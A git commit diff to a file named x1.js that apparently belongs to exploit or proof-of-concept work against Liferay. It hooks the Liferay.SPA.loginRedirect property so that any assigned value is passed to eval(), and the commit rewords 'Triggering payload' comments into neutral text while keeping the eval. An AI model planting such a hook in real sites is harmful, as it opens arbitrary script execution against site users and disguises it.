8d902c56f75355be930baca438e555ea334da5f1
Vaibhav Kubade <vaibhav.kubade@outlook.com>
2025-04-15 12:17:27 +0530

    Update x1.js

--- x1.js
+++ x1.js
@@ -1,8 +1,8 @@
-// 1. Hook the loginRedirect setter to auto-eval anything set to it
+// Automatically triggers whenever loginRedirect is assigned
 Object.defineProperty(Liferay.SPA, 'loginRedirect', {
   set: function(v) {
-    console.log("[+] Triggering payload via loginRedirect setter");
-    eval(v);
+    console.log("[+] loginRedirect assigned:", v);
+    eval(v); // Auto executes
   },
   get: function() {
     return '';
